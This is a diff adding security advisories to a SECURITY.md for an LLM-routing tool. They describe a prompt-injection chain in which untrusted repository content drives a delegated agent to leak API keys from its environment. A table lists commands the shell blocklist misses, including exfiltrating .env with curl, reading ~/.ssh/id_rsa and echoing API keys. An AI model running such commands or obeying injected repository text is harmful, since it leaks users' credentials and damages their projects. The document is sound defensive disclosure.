@@ -5,6 +5,50 @@
 > sensitive prompts, and writes audit-grade logs. This document covers what
 > Chuzom does to protect those flows and how to report security issues.
 
+## ⚠️ Active advisory — CHZ-SA-2026-001
+
+**Affected:** all released versions **≤ 1.1.1**, when the agentic delegation surface
+(`llm_act` / `llm_delegate`) is used.
+**Severity:** high. **Status:** open; fix tracked as WP-01.
+**Published:** 2026-08-11.
+
+**Do not run `llm_act` or `llm_delegate` against a repository, issue tracker, or any other content
+you do not trust.** Set `CHUZOM_DELEGATE=off` if you do not use these tools.
+
+Two defects combine into a working prompt-injection → credential-exfiltration chain:
+
+1. **Delegated subprocesses inherit the full parent environment.** `agentic/react.py` and
+   `agentic/adapters.py` spawn child processes without an explicit `env=` allowlist, so every
+   provider API key in the parent environment is readable by anything the child runs. The
+   repository already contains `safe_subprocess.py` for exactly this purpose; these two paths do
+   not use it. `CodexAdapter` additionally bypasses the codebase's own safe
+   `codex_agent.run_codex()`.
+2. **The agentic path does not apply the injection boundary it ships with.** The existing
+   `wrap_prompt_with_boundaries` / `_is_injection_attempt` guards are not called on the
+   `agentic/service.py` → `TaskLedger` → `pack_prompt` route, so hostile text in repository
+   content reaches the planner as if it were user instruction.
+
+Together, untrusted repository content can direct a delegated agent to run a shell command that
+reads the environment and writes the values somewhere it controls. The command blocklist in
+`_bash_block_reason` is not a mitigation: a model that can emit arbitrary shell can trivially
+evade a keyword list, and it is treated as defence in depth only.
+
+**Workarounds until the fix ships**
+- `CHUZOM_DELEGATE=off` disables the affected surface.
+- Only delegate against repositories you control end to end.
+- Run provider keys out of the environment where your host supports it, or use a shell whose
+  environment holds no long-lived credentials.
+
+Related, same advisory — **updated 2026-08-12, partially resolved.** "Verified" now means the
+repository actually changed: acceptance checks read `git diff` and newly created files rather than
+the executing agent's own report, and a `return True` stub submitted as an acceptance check is
+rejected. Irreversible milestones no longer auto-freeze on a bare pass; an unisolated one is
+surfaced instead.
+
+Still open: irreversible milestones are **refused rather than sandboxed**. Nothing creates a git
+worktree, so the "runs in an isolated worktree" half of the original claim remains unimplemented —
+the merge-only-if-verified half is wired, the run-it-somewhere-safe half is not. Tracked as WP-09.
+
 ## Reporting a vulnerability
 
 If you find a vulnerability, **please do not open a public issue.**
@@ -27,7 +71,9 @@ work to it.
 
 | Version | Supported | Security fixes through |
 |---|---|---|
-| 0.0.x (current dogfood) | ✅ | All releases |
+| 1.1.x (current) | ✅ | All releases |
+| ≤ 1.1.1 | ⚠️ | Affected by **CHZ-SA-2026-001** (above) |
+| 0.0.x | ✅ | All releases |
 | Pre-fork llm-router | ⚠️ | Use Chuzom; llm-router gets best-effort |
 
 Production users should upgrade to the latest 0.0.x release. v0.1.0 (the
@@ -139,6 +185,84 @@ public-ring release) is the first version with a formal LTS commitment.
   1. `chuzom.signals.pii.PiiSignal` at prompt-routing time
   2. `chuzom.org_policy._scan_for_plaintext_secrets` at policy-load time
   3. `chuzom.enterprise.redaction.redact_prompt` at lineage-write time
+
+## Enforcement hooks CAN block your tools — and what stops a lockout
+
+Stated because this document previously said nothing about it, while the behaviour is
+routine and visible to every user in `smart` and `hard` enforcement modes.
+
+`PreToolUse` enforcement **blocks core tools** — `Bash`, `Read`, `Edit`, `Write` —
+until a routing tool is called. This is the mechanism those modes are built on, not an
+edge case, and v13 removed an earlier "coding session" exemption specifically to make
+it stricter.
+
+What is guaranteed is **no permanent lockout**, by three independent releases:
+
+- calling any `llm_*` tool clears the lock for the turn;
+- two blocks of the same tool in one turn auto-pivot;
+- the same tool blocked 3+ times in two minutes auto-pivots.
+
+`chuzom set-enforce off` disables enforcement entirely.
+
+**The distinction matters.** "Hooks cannot block core tools" and "hooks cannot lock you
+out" sound alike and are not: the first is false, the second is true. A user who reads
+the first forms a safety expectation the software does not meet. The downstream
+llm-router copy of this document asserted the false version with a ✅; this one asserted
+neither, which is better but still left the reader to discover the behaviour by hitting
+it.
+
+## CHUZOM_DIRECT_EXECUTION — what it actually grants
+
+**Default: on.** With it enabled, `hooks/auto-route.py` attempts to answer a prompt
+locally before Claude Code sees it. For prompts it classifies as needing file work, it
+runs a tool-calling agent loop (`hooks/agent_loop.py`) that hands the local model
+`write_file`, `edit_file` and `run_command` — the last via `subprocess.run(cmd,
+shell=True, ...)` — unsupervised, with no confirmation step, up to 15 iterations.
+
+### What is actually enforced
+
+- File-path operations are confined to the project root. This works as described.
+- `run_command` is filtered by `_BLOCKED_COMMANDS`, a regex over a handful of
+  top-level destructive patterns.
+
+### What that filter does NOT cover — measured, not estimated
+
+Of twelve representative commands, **three** are blocked:
+
+| command | blocked |
+|---|---|
+| `rm -rf /`, `bash -c 'rm -rf /'`, `rm  -rf  /` | ✅ |
+| `rm -rf ./src` — targeted delete inside the project | ❌ |
+| `rm -rf $HOME/Documents` — home via shell expansion | ❌ |
+| `git push --force origin main` | ❌ |
+| `git reset --hard HEAD~5` | ❌ |
+| `npm install <anything>` / `pip install <anything>` | ❌ |
+| `cat ../../.ssh/id_rsa` — read outside the project | ❌ |
+| `curl -X POST https://… -d @.env` — exfiltrate secrets | ❌ |
+| `echo $OPENAI_API_KEY` | ❌ |
+
+The blocklist stops catastrophic *system* damage. It does not stop project damage,
+credential disclosure, or network exfiltration.
+
+### A safety claim in the code that does not hold
+
+`agent_loop.py`'s module docstring states *"All file operations are sandboxed to the
+project directory."* That is true of `write_file`/`edit_file` and **false in effect**,
+because `run_command` runs an arbitrary shell string: `cat ../../.ssh/id_rsa` is not a
+"file operation" the sandbox sees. A reader forms a guarantee the code does not provide.
+
+### Should it default to on?
+
+Stated as a judgement, not a fact: **probably not, in this shape.** A default-on feature
+that grants unsupervised shell to a local model is a larger grant than "route my prompts
+cheaply" implies, and a user who never opts in has no reason to expect it. The
+conservative alternatives are (a) default the agent loop off while leaving read-only
+direct execution on, or (b) keep it on but drop `run_command` from the default tool set.
+
+This entry documents the current state rather than changing it — a default change needs
+its own decision and its own release note, not a drive-by.
+
+Disable with `CHUZOM_DIRECT_EXECUTION=false`.
 
 ## Threats explicitly NOT in scope
 
